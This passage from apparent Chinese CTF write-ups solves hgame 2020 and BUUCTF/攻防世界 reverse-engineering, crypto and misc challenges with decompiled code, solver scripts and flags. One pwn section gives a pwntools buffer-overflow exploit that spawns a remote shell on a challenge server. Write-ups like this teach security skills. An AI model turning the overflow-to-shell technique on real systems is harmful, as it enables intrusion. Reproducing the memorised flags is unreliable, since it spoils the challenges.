0i64; for ( l = 0; l &lt; 3; ++l ) v12 += *(&amp;v22 + 3 * l + k) * *(_QWORD *)sub_1400031E0(&amp;v14, l + 3 * j); if ( *(&amp;v31 + 3 * j + k) != v12 ) { v3 = sub_140001900(std::cout, \"error\"); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, sub_140002830); sub_140003010(&amp;v14); sub_140002FA0(&amp;v13); return 0i64; } } } v6 = sub_140001900(std::cout, \"you are good at re\"); std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v6, sub_140002830); 最主要的部分（假装）分析一遍，发现只需要矩阵求逆和矩阵乘法，就可以得到flag 尝试一下 import numpy as npa = np.array([[1, 0, 1], [0, 1, 1], [1, 2, 2]])b = np.linalg.inv(a)# print(b)# print(np.dot(a,b))c = np.array([[26727, 24941, 101], [29285, 26995, 29551], [29551, 25953, 29561]])flag = ''d = np.dot(c, b)for i in range(3): for j in range(3): flag += str(int(d.item(i, j))) + '_'flag = 'hgame{' + flag[:-1] + '}'print(flag) 提交提示成功，猜测正确 hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943} PWNHard_AAAAAIDA反编译 int __cdecl main(int argc, const char **argv, const char **envp){ char s; // [esp+0h] [ebp-ACh] char v5; // [esp+7Bh] [ebp-31h] unsigned int v6; // [esp+A0h] [ebp-Ch] int *v7; // [esp+A4h] [ebp-8h] v7 = &amp;argc; v6 = __readgsdword(0x14u); alarm(8u); setbuf(_bss_start, 0); memset(&amp;s, 0, 0xA0u); puts(\"Let's 0O0o\\\\0O0!\"); gets(&amp;s); if ( !memcmp(\"0O0o\", &amp;v5, 7u) ) backdoor(); return 0;}//backdoorint backdoor(){ return system(\"/bin/sh\");} 所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload from pwn import *io = remote(\"47.103.214.163\",\"20000\")#io=process(\"./Hard_AAAAA\")io.recvuntil(\"Let's 0O0o\\\\0O0!\")payload='a'*123+'0O0o\\0O0'io.sendline(payload)io.interactive() 最终得到flag： hgame{0OoO0oo0O0Oo} CryptoInfantRSA简单的RSA解密，p和q都已经分解出来了，其它的没什么难度 #-*- coding:utf-8 -*-def gcdext(a, b): \"\"\" a: 模的取值 b: 想求逆的值 \"\"\" if b == 0: return 1, 0, a x, y, gcd = gcdext(b, a % b) return y, x - a // b * y, gcdc = 275698465082361070145173688411496311542172902608559859019841p = 681782737450022065655472455411q = 675274897132088253519831953441e = 13n = p * q# print(k)fai = (p - 1) * (q - 1)(d, k, g) = gcdext(e, fai)# print(fai)# print(k)# print(m)m = pow(c, d, n)# print(m)f = m.to_bytes(22, byteorder='big')print(f) 直接求解出来flag hgame{t3Xt6O0k_R5A!!!} misc欢迎参加HGame！首先看到一长串似曾相识的东西 Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t 像是摩斯电码base64加密之后的东西 所以base64解码之后 .-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...-- 果然是摩斯电码，然后解摩斯电码 #-*- coding:utf-8 -*-CODE = {'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.', '.': '.-.-.-', ':': '---...', ',': '--..--', ';': '-.-.-.', '?': '..--..', '=': '-...-', '\\'': '.----.', '/': '-..-.', '!': '-.-.--', '-': '-....-', '_': '..--.-', '\"': '.-..-.', '(': '-.--.', ')': '-.--.-', '$': '...-..-', '&amp;': '.-...', '@': '.--.-.' }def Decode(str): Decode_value = CODE.keys() Decode_key = CODE.values() Decode_dict = dict(zip(Decode_key, Decode_value)) text = '' msg = str.split(' ') for s in msg: if s in Decode_dict.keys(): text += Decode_dict[s] return textprint(Decode('.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--')) 这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame： hgame{W3LC0ME_TO_2020_HGAM3} 壁纸下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815 解压出来打开flag.txt，内容如下： \\u68\\u67\\u61\\u6d\\u65\\u7b\\u44\\u6f\\u5f\\u79\\u30\\u75\\u5f\\u4b\\u6e\\u4f\\u57\\u5f\\u75\\u4e\\u69\\u43\\u30\\u64\\u33\\u3f\\u7d unicode编码，解码得： hgame{Do_y0u_KnOW_uNiC0d3?} 签到题ProPlus压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下： Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fences first, Five Caesar next. English sentense first, zip password next. 根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码 Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.EAVMUBAQHQMVEPDT 解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag hgame{3Nc0dInG_@lL_iN_0Ne!} 这题有各种各样的编码，还不错 Week2REunpack明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）脱壳的过程借鉴https://www.52pojie.cn/thread-1048649-1-1.html很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出 #include &lt;idc.idc&gt;#define PT_LOAD 1#define PT_DYNAMIC 2static main(void){ auto ImageBase,StartImg,EndImg; auto e_phoff; auto e_phnum,p_offset; auto i,dumpfile; ImageBase=0x400000; StartImg=0x400000; EndImg=0x0; if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f ) { if(dumpfile=fopen(\"D:\\\\dumpfile\",\"wb\")) { e_phoff=ImageBase+Qword(ImageBase+0x20); Message(\"e_phoff = 0x%x\\n\", e_phoff); e_phnum=Word(ImageBase+0x38); Message(\"e_phnum = 0x%x\\n\", e_phnum); for(i=0;i&lt;e_phnum;i++) { if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC) { p_offset=Qword(e_phoff+0x8); StartImg=Qword(e_phoff+0x10); EndImg=StartImg+Qword(e_phoff+0x28); Message(\"start = 0x%x, end = 0x%x, offset = 0x%x\\n\", StartImg, EndImg, p_offset); dump(dumpfile,StartImg,EndImg,p_offset); Message(\"dump segment %d ok.\\n\",i); } e_phoff=e_phoff+0x38; } fseek(dumpfile,0x3c,0); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fseek(dumpfile,0x28,0); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fputc(0x00,dumpfile); fclose(dumpfile); }else Message(\"dump err.\"); }}static dump(dumpfile,startimg,endimg,offset) { auto i; auto size; size=endimg-startimg; fseek(dumpfile,offset,0); for ( i=0; i &lt; size; i=i+1 ) { fputc(Byte(startimg+i),dumpfile); }} 尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分 scanf((__int64)\"%42s\", v7); v5 = 0; for ( i = 0; i &lt;= 41; ++i ) { if ( i + v7[i] != (unsigned __int8)byte_6CA0A0[i] ) v5 = 1; } if ( v5 == 1 ) { v0 = \"Wrong input\"; printf(\"Wrong input\", v7); } else { v0 = \"Congratulations! Flag is your input\"; printf(\"Congratulations! Flag is your input\", v7); } 本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag #include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { unsigned char ida_chars[] = { 0x68, 0x68, 0x63, 0x70, 0x69, 0x80, 0x5B, 0x75, 0x78, 0x49, 0x6D, 0x76, 0x75, 0x7B, 0x75, 0x6E, 0x41, 0x84, 0x71, 0x65, 0x44, 0x82, 0x4A, 0x85, 0x8C, 0x82, 0x7D, 0x7A, 0x82, 0x4D, 0x90, 0x7E, 0x92, 0x54, 0x98, 0x88, 0x96, 0x98, 0x57, 0x95, 0x8F, 0xA6 }; string flag; for(int i=0;i&lt;42;i++) { flag+=ida_chars[i]-i; } cout&lt;&lt;flag&lt;&lt;endl; return 0;} 最后输出flag hgame{Unp@cking_1s_R0m4ntic_f0r_r3vers1ng} Classic_CrackMePEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度， dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里 private void button1_Click(object sender, EventArgs e) { if (this.status == 1) { MessageBox.Show(\"你已经激活成功啦，快去提交flag吧~~~\"); return; } string text = this.textBox1.Text; if (text.Length != 46 || text.IndexOf(\"hgame{\") != 0 || text.IndexOf(\"}\") != 45) { MessageBox.Show(\"Illegal format\"); return; } string base64iv = text.Substring(6, 24); string str = text.Substring(30, 15); try { Aes aes = new Aes(\"SGc0bTNfMm8yMF9XZWVLMg==\", base64iv); Aes aes2 = new Aes(\"SGc0bTNfMm8yMF9XZWVLMg==\", \"MFB1T2g5SWxYMDU0SWN0cw==\"); string text2 = aes.DecryptFromBase64String(\"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=\"); if (text2.Equals(\"Same_ciphertext_\")) { byte[] array = new byte[16]; Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16); if (Convert.ToBase64String(array).Equals(\"dJntSWSPWbWocAq4yjBP5Q==\")) { MessageBox.Show(\"注册成功！\"); this.Text = \"已激活，欢迎使用！\"; this.status = 1; } else { MessageBox.Show(\"注册失败！\\nhint: \" + aes2.DecryptFromBase64String(\"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=\")); } } else { MessageBox.Show(\"注册失败！\\nhint: \" + aes2.DecryptFromBase64String(\"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=\")); } } catch { MessageBox.Show(\"注册失败！\"); } } 发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。 对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果 对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。 不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。 直接python解决： from Crypto.Cipher import AESimport base64# 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文class AesCrypter(object): def __init__(self, key, iv): self.key = key self.iv = iv def pkcs7padding(self, text): bs = AES.block_size # 16 length = len(text) bytes_length = len(bytes(text, encoding='utf-8')) padding_size = length if (bytes_length == length) else bytes_length padding = bs - padding_size % bs padding_text = chr(padding) * padding return text + padding_text def pkcs7unpadding(self, text): length = len(text) unpadding = ord(text[length - 1]) return text[0:length - unpadding] def encrypt(self, content): cipher = AES.new(self.key, AES.MODE_CBC, self.iv) content_padding = self.pkcs7padding(content) aes_encode_bytes = cipher.encrypt(bytes(content_padding, encoding='utf-8')) result = base64.b64encode(aes_encode_bytes).decode(encoding='utf-8') return result def decrypt(self, content): cipher = AES.new(self.key, AES.MODE_CBC, self.iv) # base64解码 aes_encode_bytes = base64.b64decode(content) # 解密 aes_decode_bytes = cipher.decrypt(aes_encode_bytes) # 重新编码 result = aes_decode_bytes.decode(encoding='utf-8') # 去除填充内容 result = self.pkcs7unpadding(result) if result == None: return \"\" else: return resultkey = base64.b64decode(\"SGc0bTNfMm8yMF9XZWVLMg==\")fakeIV = base64.b64decode('MFB1T2g5SWxYMDU0SWN0cw==')plainText = \"Same_ciphertext_\"ciperText = \"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=\"aesCipher = AesCrypter(key, fakeIV)fakePlainText = aesCipher.decrypt(ciperText)# print(fakePlainText)IV = ''for i in range(16): IV += chr(ord(fakePlainText[i]) ^ fakeIV[i] ^ ord(plainText[i]))# print(\"IV : \" + IV)# /TyXYzPnY;$)\\we_IV = base64.b64encode(IV.encode('utf-8')).decode('utf-8')cipherText2 = aesCipher.encrypt(plainText)cipherText2 = base64.b64decode(cipherText2).hex()[:32]cipherText3 = 'dJntSWSPWbWocAq4yjBP5Q=='cipherText3 = base64.b64decode(cipherText3).hex()[:32]# print(cipherText2 + cipherText3)cipherText4 = bytes.fromhex(cipherText2 + cipherText3)cipherText4 = base64.b64encode(cipherText4)# print(cipherText4)plainText3 = aesCipher.decrypt(cipherText4)# print(plainText3)# Same_ciphertext_DiFfer3Nt_w0r1dflag = ''flag += 'hgame{' + IV + plainText3[16:] + '}'print(flag)# hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d} 最终的flag hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d} babyPy这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来 dis指令表见https://docs.python.org/3/library/dis.html#python-bytecode-instructions 还原出来的函数原型（想打死命名的人） def encrypt(OOo): O0O = OOo[::-1] O0o = list(O0O) for O0 in range(1, len(O0o)): Oo = O0o[O0-1] ^ O0o[O0] O0o[O0] = Oo O = bytes(O0o) return O.hex() 所以只需要反过来异或一遍就可以了 s = bytes.fromhex('7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22')c = list(str)for i in range(len(c) - 1, 0, -1): c[i] ^= c[i - 1]print(bytes(c[::-1])) 输出flag hgame{sT4cK_1$_sO_e@Sy~~}","link":"/2020/01/25/hgame-wp/"},{"title":"BUUCTF-re部分题解","text":"看到有些大佬在做BUUCTF的题，看了一下，题目很多，但是感觉良莠不齐，并且开始的一些题目有些太简单了，就当是多做些题目了。 easyre确实非常easy，直接拖进IDA看到flag flag{this_Is_a_EaSyRe} reverse1IDA打开，通过字符串窗口找到主程序，整个程序流程很简单 for ( j = 0; ; ++j ) { v8 = j; v2 = j_strlen(Str2); if ( v8 &gt; v2 ) break; if ( Str2[j] == 'o' ) Str2[j] = '0'; } sub_1400111D1(\"input the flag:\"); sub_14001128F(\"%20s\", &amp;Str1); v3 = j_strlen(Str2); if ( !strncmp(&amp;Str1, Str2, v3) ) sub_1400111D1(\"this is the right flag!\\n\"); else sub_1400111D1(\"wrong flag\\n\"); 只有这一部分有用，str2时内存中的一个字符串，只是将输入的字符串和变换过后的str2进行一个简单的对比，一样则输出正确 str2的变换就是将所有的o变换成0，str2为‘{hello_world}’，所以flag为 flag{hell0_w0rld} reverse2和上一题完全一样，只不过时ELF64文件，把i和r全部替换成了1 flag{hack1ng_fo1_fun} helloworld安卓逆向，直接apktool反编译，在MainActivity.smail文件里找到了flag flag{7631a988259a00816deda84afb29430a} 新年快乐简单加壳软件，在加壳时没做任何的修改，直接upx脱壳，IDA反编译，通过字符串直接找到flag flag{HappyNewYear!} 内涵的软件IDA反编译可以直接发现flag，把花括号里的放进flag{}里即可 flag{49d3c93df25caad81232130f3d2ebfad} xor一看题目就是到要逆运算异或，反编译之后发现关键运算 for ( i = 1; i &lt; 33; ++i ) v6[i] ^= v6[i - 1]; v3 = global; if ( !strncmp(v6, global, 0x21uLL) ) printf(\"Success\", v3); 所以逆运算就好了 #include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { unsigned char ida_chars[] = { 0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11, 0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F, 0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F, 0x47, 0x32, 0x4F }; string flag; flag+=ida_chars[0]; for(int i=1;i&lt;33;i++) { flag+=(ida_chars[i]^ida_chars[i-1]); } cout&lt;&lt;flag&lt;&lt;endl; return 0;} 直接输出flag flag{QianQiuWanDai_YiTongJiangHu} reverse3和bugku的love是同一个题，不再赘述 不一样的flag减弱般的迷宫题，上下左右全部都标示的清清楚楚 迷宫如下图 *11110100001010000101111# 转换成5*5的方阵，*走到#即可 flag{222441144222} 刮开有奖IDA反编译出来，发现需要输入8位，经过sub_4010F0这个函数的变换后，在经过两个base64变换（查看函数内部自己发现），满足条件即正确 sub_4010F0这个函数内容比较多，但是和输入的字符串无关，所以直接直接把函数实现然后求出来正确的取值就可以了（后面的条件略多，这里的变换实际上只需要第一位和第五位） #include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int __cdecl decrypt(char *a1, int a2, int a3) { int result; // eax int i; // esi int v5; // ecx int v6; // edx result = a3; for (i = a2; i &lt;= a3; a2 = i) { v5 = i; v6 = a1[i]; if (a2 &lt; result &amp;&amp; i &lt; result) { do { if (v6 &gt; a1[result]) { if (i &gt;= result) break; ++i; a1[v5] = a1[result]; if (i &gt;= result) break; while (a1[result] &lt;= v6) { if (++i &gt;= result) goto LABEL_13; } if (i &gt;= result) break; v5 = i; a1[result] = a1[i]; } --result; } while (i &lt; result); } LABEL_13: a1[result] = v6; decrypt(a1, a2, i - 1); result = a3; ++i; } return result;}char v9[20] = {90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103};int main() { cout &lt;&lt; v9 &lt;&lt; endl; decrypt(v9, 0, 10); cout &lt;&lt; v9 &lt;&lt; endl; return 0;} 输出如图所示 接着分析下面的部分 if ( String == v9 + 34 // 第一位等于51+34=85--&gt;'U' &amp;&amp; v21 == v13 //第2位，等于v13,即sub_4010F0函数返回值的第5位值--&gt;'J' &amp;&amp; 4 * v22 - 141 == 3 * v11 &amp;&amp; v23 / 4 == 2 * (v16 / 9) &amp;&amp; !strcmp(v6, \"ak1w\") // 第6,7,8个字符base64之后，等于ak1w &amp;&amp; !strcmp(v7,\"V1Ax\") // 第3,4,5个字符，base64之后等于V1Ax ) { MessageBoxA(hDlg, \"U g3t 1T!\", \"@_@\", 0); } 还多与两个条件就检验正确就可以了 得到flag flag{UJWP1jMp} SimpleRev这题没什么难度，IDA打开 int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ int v3; // eax char v4; // [rsp+Fh] [rbp-1h] while ( 1 ) { while ( 1 ) { printf(\"Welcome to CTF game!\\nPlease input d/D to start or input q/Q to quit this program: \", argv, envp); v4 = getchar(); if ( v4 != 'd' &amp;&amp; v4 != 'D' ) break; Decry(); } if ( v4 == 'q' || v4 == 'Q' ) Exit(); puts(\"Input fault format!\"); v3 = getchar(); putchar(v3); }} main函数里面没有什么需要注意的东西，解决问题的重点就都放在Decry()这个函数里了 unsigned __int64 Decry(){ char v1; // [rsp+Fh] [rbp-51h] int v2; // [rsp+10h] [rbp-50h] int v3; // [rsp+14h] [rbp-4Ch] int i; // [rsp+18h] [rbp-48h] int v5; // [rsp+1Ch] [rbp-44h] char src[8]; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] int v8; // [rsp+30h] [rbp-30h] __int64 v9; // [rsp+40h] [rbp-20h] __int64 v10; // [rsp+48h] [rbp-18h] int v11; // [rsp+50h] [rbp-10h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); *(_QWORD *)src = 'SLCDN'; v7 = 0LL; v8 = 0; v9 = 'wodah'; v10 = 0LL; v11 = 0; text = join(key3, (const char *)&amp;v9); // text=killshadow strcpy(key, key1); // key=key1='ADSFK' strcat(key, src); // key='ADSFKNDCLS' v2 = 0; v3 = 0; getchar(); v5 = strlen(key); for ( i = 0; i &lt; v5; ++i ) { if ( key[v3 % v5] &gt; '@' &amp;&amp; key[v3 % v5] &lt;= 'Z' ) key[i] = key[v3 % v5] + 32; ++v3; } // 转换为小写 // key='adsfkndcls' printf(\"Please input your flag:\", src); while ( 1 ) { v1 = getchar(); if ( v1 == '\\n' ) // 遇到回车结束 break; if ( v1 == ' ' ) // 跳过空格 { ++v2; } else { if ( v1 &lt;= 96 || v1 &gt; 122 ) { if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 ) // 大写字母 str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; } else // 小写字母 { str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; } if ( !(v3 % v5) ) putchar(32); ++v2; } } if ( !strcmp(text, str2) ) puts(\"Congratulation!\\n\"); else puts(\"Try again!\\n\"); return __readfsqword(0x28u) ^ v12;} 需要注意src和v9本身是以long long类型赋值，转换成字符串要记得逆序，接下来的过程就很简单了，程序的过程很清楚，直接逆向运算就可以算出来结果了 #include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main(void) { int n = 0, v5 = 10, v3 = 10, v2 = 0; char v1; char flag[11] = {0}; char key[] = \"adsfkndcls\"; char text[] = \"killshadow\";//通过放缩，j只能取0-3之间 for (int j = 0; j &lt; 4; ++j) { for (v2 = 0; v2 &lt; 10; ++v2) { v1 = text[v2] - 97 + 26 * j - 97 + key[v3++ % v5] + 39; if ((v1 &gt;= 65 &amp;&amp; v1 &lt;= 90) || (v1 &gt;= 97 &amp;&amp; v1 &lt;= 122)) { flag[v2] = v1; if (++n == 10) { printf(\"flag{%s}\\n\", flag); return 0; } } } } return 0;} 这里的j是用来逆向取余运算时候遍历，放缩之后得到一个范围，然后计算就可以了 flag{KLDQCUDFZO} Java逆向解密第一次做Java逆向，顺便也熟悉熟悉Java，所以逆向程序也是用Java写的 附件打开是class文件，IDEA直接可以反编译，反编译出来的代码很简单 import java.util.ArrayList;import java.util.Scanner;public class Reverse { public Reverse() { } public static void main(String[] args) { Scanner s = new Scanner(System.in); System.out.println(\"Please input the flag ：\"); String str = s.next(); System.out.println(\"Your input is ：\"); System.out.println(str); char[] stringArr = str.toCharArray(); Encrypt(stringArr); } public static void Encrypt(char[] arr) { ArrayList&lt;Integer&gt; Resultlist = new ArrayList(); for(int i = 0; i &lt; arr.length; ++i) { int result = arr[i] + 64 ^ 32; Resultlist.add(result); } int[] KEY = new int[]{180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65}; ArrayList&lt;Integer&gt; KEYList = new ArrayList(); for(int j = 0; j &lt; KEY.length; ++j) { KEYList.add(KEY[j]); } System.out.println(\"Result:\"); if (Resultlist.equals(KEYList)) { System.out.println(\"Congratulations！\"); } else { System.err.println(\"Error！\"); } }} 把KEY每个值都减去64^32就好了，没什么难度，所以试试用Java写，练练手 package com.company;import java.util.ArrayList;public class Main { public static void main(String[] args) { int[] KEY = new int[]{180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65}; ArrayList&lt;Integer&gt; resultList = new ArrayList&lt;&gt;(); for (int value : KEY) { resultList.add(value - 64 ^ 32); }// System.out.println(resultList); StringBuilder s = new StringBuilder(); for (int value:resultList){ s.append((char)value); } System.out.println(\"flag{\"+s+\"}\"); }} 直接输出flag flag{This_is_the_flag_!} findit不管是apktool反编译还是直接cfr反编译到代码，都可以找到一串很像flag的字符数组 pvkq{m164675262033l4m49lnp7p9mnk28k75} 直接凯撒密码解密，a与k之间相差10，所以key=10 flag{c164675262033b4c49bdf7f9cda28a75}","link":"/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"攻防世界-re部分题解","text":"攻防世界的题目质量还是比较高的，题目类型很多，难度也有一定的梯度，挺适合不断进阶学习。 insanityIDA打开，进入main，发现程序在生成随机数，然后随便输出一系列字符串中的某一个，找到这一系列字符串，发现了flag int __cdecl main(int argc, const char **argv, const char **envp){ unsigned int v3; // eax unsigned int v4; // eax puts(\"Reticulating splines, please wait..\"); sleep(5u); v3 = time(0); srand(v3); v4 = rand(); puts((&amp;strs)[v4 % 0xA]); return 0;} 找到strs，其中flag 9447{This_is_a_flag} open-source这题真就连源代码都给了 #include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[]) { if (argc != 4) { printf(\"what?\\n\"); exit(1); } unsigned int first = atoi(argv[1]); if (first != 0xcafe) { printf(\"you are wrong, sorry.\\n\"); exit(2); } unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) { printf(\"ha, you won't get it!\\n\"); exit(3); } if (strcmp(\"h4cky0u\", argv[3])) { printf(\"so close, dude!\\n\"); exit(4); } printf(\"Brr wrrr grr\\n\"); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0;} 看一下源码，发现运行时要有三个参数，第一个参数给出来了，是0xcafe，第二个没有给，但是知道second%17==8，直接带到下面计算就行了，第三个是字符串的长度，为7，直接算出来就行了。 不过还需要注意，最后输出的时候是以16进制的形式输出 c0ffee simple-unpack题如其名，拿到直接upx脱壳，毫无阻碍，IDA打开直接在main里看到flag flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny} logmeinIDA打开，找到关键判断位置 strcpy(v8, \":\\\"AL_RT^L*.?+6/46\"); v7 = 'ebmarah'; v6 = 7; printf(\"Welcome to the RC3 secure password guesser.\\n\", a2, a3); printf(\"To continue, you must enter the correct password.\\n\"); printf(\"Enter your guess: \"); __isoc99_scanf(\"%32s\", s); v3 = strlen(s); if ( v3 &lt; strlen(v8) ) sub_4007C0(v8); for ( i = 0; i &lt; strlen(s); ++i ) { if ( i &gt;= strlen(v8) ) ((void (*)(void))sub_4007C0)(); if ( s[i] != (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) ) ((void (*)(void))sub_4007C0)(); } v7本身是一个长整型，但是作为字符读取，由于小端序，所以转换成的字符要反序，然后经过下面的计算就可以了 v8 = ':\\\"AL_RT^L*.?+6/46'v7 = 'harambe's = ''for i in range(len(v8)): s += chr(ord(v7[i % 7]) ^ ord(v8[i]))print(s) 输出结果 RC3-2016-XORISGUD python-trade见CG-CTF py交易 game见BUGKU 游戏过关 hello-ctf一串输入的字符串拷贝来拷贝去，实际上就是把输入的字符串变成16进制，所以直接从16进制转换成字符串就可以了 s = '437261636b4d654a757374466f7246756e'flag = bytes.fromhex(s)print(flag) 直接输出flag CrackMeJustForFun getit同样是一道简单题，写个简单的逆运算就可以了 s = 'c61b68366edeb7bdce3c6820314b7498't = ''v5 = 0while (v5 &lt; len(s)): if (v5 &amp; 1): v3 = 1 else: v3 = -1 t += chr(ord(s[v5]) + v3) v5 = v5 + 1t='SharifCTF{'+t+'}'print(t) 输出flag SharifCTF{b70c59275fcfa8aebf2d5911223c6589} re1IDA打开追踪字符串，发现flag和输入直接进行比较，找到flag的位置，然后将16进制转换位字符串然后逆序即可 DUTCTF{We1c0met0DUTCTF} no-strings-attached这题有点意思，整个程序没有直接出现的字符串，先打开IDA看看，找到一个decrypt函数，一看就知道这个是最重要的部分，又不想再写脚本去算，所以干脆开虚拟机gdb动态调试，在decrypt处下断点，等运行完decrypt函数之后，发现程序把某个地址拷进了eax，所以用x/6sw $eax来查看，结果发现了flag 9447{you_are_an_international_mystery} csaw2013reversing3这题比较有意思，一打开输出的是乱码，用IDA打开发现这些代码没有解密，有一个解密程序但是没有运行，所以OD直接调试改汇编，先运行解密函数，然后跳转到MessageBoxA函数，在窗口中输出来的就是真正的flag，操作比较简单，就不赘述了。 flag{reversing_is_not_that_hard!} maze见CG-CTF maze 666IDA打开看到了假flag，不管它，找到关键函数 int __fastcall encode(const char *a1, __int64 a2){ char v3[32]; // [rsp+10h] [rbp-70h] char v4[32]; // [rsp+30h] [rbp-50h] char v5[40]; // [rsp+50h] [rbp-30h] int v6; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] i = 0; v6 = 0; if ( strlen(a1) != key ) return puts(\"Your Length is Wrong\"); for ( i = 0; i &lt; key; i += 3 ) { v5[i] = key ^ (a1[i] + 6); v4[i + 1] = (a1[i + 1] - 6) ^ key; v3[i + 2] = a1[i + 2] ^ 6 ^ 